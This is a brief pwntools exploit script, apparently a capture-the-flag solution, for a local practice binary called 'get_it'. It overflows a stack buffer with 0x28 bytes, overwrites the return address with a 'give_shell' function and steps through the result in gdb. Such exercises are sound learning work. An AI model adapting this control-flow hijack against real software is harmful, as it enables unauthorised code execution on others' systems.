#!/usr/bin/env python3

# Title:        XXX.py
# Description:  X
# Author:       bluecosmo


from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
elf = context.binary = ELF("./get_it")

payload = b"A" * 0x28
payload += p64(elf.symbols["give_shell"])

gdbcmds = """
b * main + 37
b do_system
c
ni
ni
ni
ni
ni
ni
ni
"""

p = process(elf.path)
p = gdb.debug(elf.path, gdbscript=gdbcmds)
p.sendline(payload)
p.interactive()
